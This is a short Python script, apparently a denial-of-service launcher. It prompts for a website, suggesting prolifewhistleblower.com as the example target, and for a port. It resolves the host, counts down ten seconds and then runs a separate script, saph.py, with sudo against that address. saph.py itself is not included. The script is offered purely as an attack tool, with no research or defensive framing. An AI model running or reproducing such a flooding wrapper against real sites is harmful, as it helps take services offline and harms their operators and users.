import os 
import sys 
import time as t 
import socket 

print(" EX ====> www.prolifewhistleblower.com ")
doshost = str(input(" Enter A Website ==> "))
port = str(input(" Port to target ==> "))

C = socket.gethostbyname(doshost)
print("-----------------------------------------")
print(" Your target ===> ", C)
print("-----------------------------------------")
print("Launching in 10 seconds......")
t.sleep(10)
os.system('clear')
os.system(f' sudo python3 saph.py -s {C} -p {port} ')

